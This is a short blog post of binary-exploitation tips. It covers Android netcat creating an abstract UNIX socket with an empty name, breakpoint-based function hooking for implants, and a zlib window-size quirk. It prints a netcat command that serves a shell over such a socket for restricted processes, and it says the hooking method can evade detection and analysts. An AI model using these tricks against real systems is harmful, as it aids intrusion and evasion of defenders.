---
title: 'Bag of Tricks'
description: 'Various tricks compiled into a blog post'
pubDate: 2023-10-14
tags: ["netcat", "network", "zlib", "hooks", "debug"]
---

# Bag of Tricks

There are various tricks I've discovered when trying to exploit binaries for fun and profit. Here are a list of some of them.

## Trick 1: Creating Abstract UNIX Sockets on Android via Netcat

``netcat`` on Android was never meant to create abstract UNIX sockets. It takes the name of the abstract socket to create and then creates it in the filesytem.

This can be further confirmed by viewing the [source code](https://github.com/landley/toybox/blob/master/toys/net/netcat.c)

```c
// open AF_UNIX socket
static int usock(char *name, int type, int out)
{
  int sockfd;
  struct sockaddr_un sockaddr;

  memset(&sockaddr, 0, sizeof(struct sockaddr_un));

  if (strlen(name) + 1 > sizeof(sockaddr.sun_path))
    error_exit("socket path too long %s", name);
  strcpy(sockaddr.sun_path, name);
  sockaddr.sun_family = AF_UNIX;

  sockfd = xsocket(AF_UNIX, type, 0);
  (out?xconnect:xbind)(sockfd, (struct sockaddr*)&sockaddr, sizeof(sockaddr));

  return sockfd;
}
```

However, an empty name is perfectly acceptable to this function and UNIX sockets exist in the abstract namespace if the first byte is null so ``netcat`` accidentally allows the creation of and connection to an abstract UNIX socket reverse shell through the below command.

```sh
# Make the abstract UNIX socket reverse shell
nc -U -s '' -L sh

# Connect to the abstract UNIX socket reverse shell
nc -U ''
```

Why this trick can come in handy is that some processes on Android will have extremely restrictive permissions when it comes to making files on the filesystem and creating sockets, but will allow the creation of abstract UNIX sockets.

This trick paired with the appropriate ROP gadget makes your life 10x easier when trying to pop a reverse shell for such restrictive processes.

## Trick 2: Function Hooks via Breakpoints

This one isn't exactly a new trick yet it's a trick I strangely don't see or hear a lot of people use.

All major operating systems provide a way for the process to hook its own breakpoints with its own handler.

For POSIX, hooking is done via ``sigaction`` with the ``SIGTRAP`` signal. For Windows, it's done via ``AddVectoredExceptionHandler`` with the ``EXCEPTION_BREAKPOINT`` exception.

This trick allows applying "detours" to be atomic which is important when making an implant where accidentally crashing the process is not an option.

If the implanter decides to use hardware instead of software breakpoints, code patching is not even needed. This may even thwart a naive cheat detection engine or anything similar. It's also significantly harder for a malware analyst to use hardware breakpoints themselves to analyze the implant.

The biggest downside is that performance for this method of hooking is much slower than detours or function pointer patching.

## Trick 3: Zlib's Max Window Size

In the [zlib Technical Details](https://www.zlib.net/zlib_tech.html) under **Compression Factor Design Quirk**, the window size is limited to ``((1 << wbits) - 262)`` rather than ``(1 << wbits)``.

If the max window size is ``w`` when decompressing, the internal ring buffer of the decompressor would need to have at least a size of ``w + 1`` bytes to successfully decompress the payload.

This then turns this piece of trivia into a powerful detail because when configuring a ``zlib`` compressor with ``wbits``,  it allows an embedded device with a RAM size of ``(1 << wbits)`` available for the decompressor to still be able to decompress the stream it produces because the number of bytes needed becomes ``((1 << wbits) - 261)`` rather than ``((1 << wbits) + 1)``. 